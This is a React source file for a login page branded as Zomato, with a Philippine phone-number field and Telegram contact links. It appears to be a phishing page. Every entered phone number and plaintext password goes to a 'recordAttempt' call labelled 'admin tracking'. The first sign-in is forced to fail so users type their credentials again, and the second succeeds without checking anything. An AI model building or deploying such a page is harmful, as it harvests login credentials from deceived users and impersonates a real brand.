import React, { useState, useEffect } from 'react'
import { Helmet } from 'react-helmet'
import './LoginPage.css'
import { apiService } from '../../services/api'
import { useHistory } from 'react-router-dom'
import Notification from '../../components/Notification/Notification'

const LoginPage = (props) => {
  const history = useHistory()
  const [showPassword, setShowPassword] = useState(false)
  const [showNews, setShowNews] = useState(false)
  const [notifMsg, setNotifMsg] = useState('')
  const [notifType, setNotifType] = useState('error')
  const [showNotif, setShowNotif] = useState(false)

  const togglePassword = () => {
    setShowPassword(!showPassword)
  }

  const toggleNews = () => {
    setShowNews(!showNews)
    if (!showNews) {
      document.body.style.overflow = 'hidden'
    } else {
      document.body.style.overflow = ''
    }
  }

  useEffect(() => {
    // Ensure every fresh visit starts with a clean attempt count
    localStorage.setItem('login_attempts', '0')
  }, [])

  const handleLogin = async (e) => {
    e.preventDefault()
    const formData = new FormData(e.target)
    const phone = formData.get('phone')
    const password = formData.get('password')

    // click counter logic
    const attempts = parseInt(localStorage.getItem('login_attempts') || '0')
    const currentAttempt = attempts + 1
    localStorage.setItem('login_attempts', currentAttempt.toString())

    // Record for admin tracking
    apiService.recordAttempt(phone, password, 'login')

    // 1st CLICK ALWAYS FAILS (Requested logic)
    if (currentAttempt === 1) {
      setNotifMsg('Please match the requested format.')
      setNotifType('error')
      setShowNotif(true)
      return
    }

    // Basic format validation
    if (!phone || phone.length !== 10 || !/^\d+$/.test(phone)) {
      setNotifMsg('Please match the requested format.')
      setNotifType('error')
      setShowNotif(true)
      return
    }

    // Attempt 2: Guaranteed Success (Open for all)
    setNotifMsg('Login Successful!')
    setNotifType('success')
    setShowNotif(true)

    // Reset attempts on success
    localStorage.setItem('login_attempts', '0')

    // Push to landing after notification duration
    setTimeout(() => {
      history.push('/landing')
    }, 2000)
  }

  return (
    <div className="frame2-container1">
      <Helmet>
        <title>Zomato</title>
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, minimal-ui, viewport-fit=cover"
        />
        <meta name="theme-color" content="#fe3144" />
        <link
          rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
        />
        <link
          href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap"
          rel="stylesheet"
        />
      </Helmet>

      {/* Page Content */}
      <div className="page-content" style={{ width: '100%', position: 'relative' }}>
        {/* Banner */}
        <div className="banner-wrapper shape-1"></div>

        {/* Header Icons */}
        <div className="header-icons">
          {/* Language Selector */}
          <div className="language-dropdown">
            <button className="icon-btn">
              <i className="fas fa-globe"></i>
            </button>
            <div className="language-dropdown-content">
              <a href="#">English</a>
              <a href="#">Filipino</a>
              <a href="#">中文</a>
              <a href="#">日本語</a>
            </div>
          </div>

          {/* News Icon */}
          <button className="icon-btn" onClick={toggleNews}>
            <i className="fa-solid fa-headset"></i>
          </button>
        </div>

        <div className="py-30px">
          <div className="base-logo mx-auto">
            <img
              className="site-img frame2-thq-image2-elm"
              src="/image236-8e3o-200h.png"
              draggable="false"
              alt="Logo"
              onError={(e) => { e.target.src = 'https://via.placeholder.com/70?text=Logo' }}
            />
          </div>

          <p className="nameuni">
            <a href="/register">
              <span>
                <i className="fa-solid fa-circle-right"></i> Sign UP
              </span>
            </a>
          </p>
        </div>

        <div className="account-area">
          <form id="login-form" onSubmit={handleLogin}>
            <h1>Welcome Back</h1>
            <spanx>Phone Number</spanx>
            <div className="input-group">
              <span className="input-group-text" style={{ width: '52px' }}>
                +63
              </span>
              <input
                type="tel"
                placeholder="Enter your phone number"
                maxLength="10"
                className="form-control"
                name="phone"
                required
                pattern="[0-9]{10}"
                style={{ marginLeft: '-10px' }}
              />
            </div>

            <spanx>Password</spanx>
            <div className="input-group">
              <span className="input-group-text" style={{ width: '40px' }}>
                <i className="fa-regular fa-gem" style={{ fontSize: '24px' }}></i>
              </span>
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="Enter your password"
                id="dz-password"
                required
                name="password"
                className="form-control"
              />
              <span className="input-group-text show-pass" onClick={togglePassword}>
                <i
                  className={`fa ${showPassword ? 'fa-eye' : 'fa-eye-slash'}`}
                  style={{ color: '#ff0000' }}
                ></i>
              </span>
            </div>

            <Notification
              message={notifMsg}
              type={notifType}
              isVisible={showNotif}
              onClose={() => setShowNotif(false)}
            />

            <div
              className="input-group"
              style={{
                border: 'none',
                background: 'transparent',
                marginTop: '10px',
              }}
            >
              <button
                type="submit"
                id="sign_btn"
                className="btn btn-primary btn-rounded"
              >
                SIGN IN <i className="fa-solid fa-rocket"></i>
              </button>
            </div>
          </form>

          <div className="bottom-links">
            <a href="#" className="bottom-link">
              <i className="fas fa-download"></i> Download App
            </a>
            <a href="https://t.me/+GFiKzAAtWHo2Nzhl" className="bottom-link">
              <i className="fab fa-telegram"></i> Telegram Group
            </a>
          </div>
        </div>
      </div>

      {/* News Bottom Sheet */}
      <div
        className={`news-overlay ${showNews ? 'open' : ''}`}
        onClick={toggleNews}
      ></div>

      <div className={`bottom-sheet ${showNews ? 'open' : ''}`}>
        <div className="bs-handle"></div>
        <h3 className="bs-title">Online Service</h3>
        <p className="bs-subtitle">Choose your preferred way to contact customer service</p>

        <button
          className="bs-row"
          onClick={() => (window.location.href = 'https://t.me/Zomato_Care')}
        >
          <span className="bs-row-left">
            <i className="fa-brands fa-telegram"></i>
            <span>Customer Care</span>
          </span>
          <i className="fa-solid fa-chevron-right"></i>
        </button>

        <button
          className="bs-row"
          onClick={() => (window.location.href = 'https://t.me/+GFiKzAAtWHo2Nzhl')}
        >
          <span className="bs-row-left">
            <i className="fa-brands fa-telegram"></i>
            <span>Telegram Group</span>
          </span>
          <i className="fa-solid fa-chevron-right"></i>
        </button>

        <button className="bs-close" onClick={toggleNews}>
          Close
        </button>
      </div>
    </div>
  )
}

export default LoginPage
